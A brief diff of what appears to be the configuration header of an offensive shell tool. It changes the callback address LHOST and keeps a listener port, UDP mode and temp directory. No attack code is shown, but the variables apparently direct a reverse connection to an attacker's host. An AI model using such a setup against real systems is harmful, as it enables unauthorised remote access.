@@ -7,7 +7,7 @@
 #         \/     \/            \/                \/             \/     \/
 # v0.2 BETA                                         Last update 23/07/2017
 
-LHOST="192.168.1.19"
+LHOST="192.168.10.22"
 LPORT="4242"
 LMTHD="--udp"
 TMPDIR="/var/lock"
